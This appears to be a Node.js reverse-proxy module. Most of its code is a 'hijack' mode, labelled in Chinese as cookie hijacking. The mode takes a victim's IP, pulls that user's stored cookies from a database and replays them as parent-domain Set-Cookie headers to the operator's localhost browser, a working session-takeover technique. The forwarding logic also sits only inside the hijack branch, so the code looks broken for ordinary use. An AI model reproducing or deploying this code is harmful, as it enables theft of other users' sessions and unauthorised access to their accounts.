const http = require('http')
const url = require('url')
const net = require('net')

module.exports = function ({ req, res, config,db }) {
    let host = req.headers.host
    let port = net.isIP(host) > 0 ? config.get('DEFAULT') : config.get(host)

    if (!port) {
        return res.end('reverse-proxy: cant find config for ' + host)
    }

    let options = {
        host: '127.0.0.1',
        port: port,
        method: req.method,
        headers: req.headers,
        path: url.parse(req.url).path
    }

    //劫持 cookie
    const hijack_ip = process.argv[2] == '-hijack' ? process.argv[3] : null
    if(hijack_ip){
        console.log('hijack mode:', hijack_ip)
        db.get('node-reverse-proxy:::ffff:'+hijack_ip, (err,val)=>{
            let client_ip = req.connection.remoteAddress
            if(client_ip == '::ffff:127.0.0.1' && val){
                val = JSON.parse(val)
                req.pipe(http.request(options, response => {
                    response.headers['set-cookie'] = val.cookie.split(';').map(cookie => {
                        return `${cookie}; Domain=${req.headers.host.split('.').slice(-2).join('.')}`
                    })
                    res.writeHead(response.statusCode, response.headers)
                    response.pipe(res)
                }).on('error', e => {
                    console.log(e)
                }))
            }else {
                req.pipe(http.request(options, response => {
                    res.writeHead(response.statusCode, response.headers)
                    response.pipe(res)
                }).on('error', e => {
                    console.log(e)
                }))
            }
        })
    }
}